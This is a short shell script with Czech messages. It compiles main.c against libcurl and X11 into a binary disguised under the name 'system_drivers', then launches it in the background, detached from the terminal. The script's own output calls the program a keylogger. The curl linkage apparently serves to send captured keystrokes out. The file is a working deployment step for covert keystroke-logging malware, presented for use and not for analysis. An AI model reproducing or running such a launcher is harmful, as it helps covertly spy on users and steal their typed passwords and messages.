#!/bin/sh
if ! command -v gcc >/dev/null 2>&1; then echo "[!] Chybí gcc"; exit 1; fi
[ ! -f "main.c" ] && echo "[!] Chybí main.c" && exit 1

gcc -o system_drivers main.c -lcurl -lX11 -Wall -Wno-stringop-truncation -Wno-format-truncation 2>&1
[ $? -ne 0 ] && echo "[!] Chyba překladu" && exit 1

echo "[*] Spouštím keylogger (odpojen od terminalu)..."
nohup ./system_drivers > /dev/null 2>&1 & disown
echo "[+] Běží. PID: $!"
echo "[*] Stop: pkill -f system_drivers"
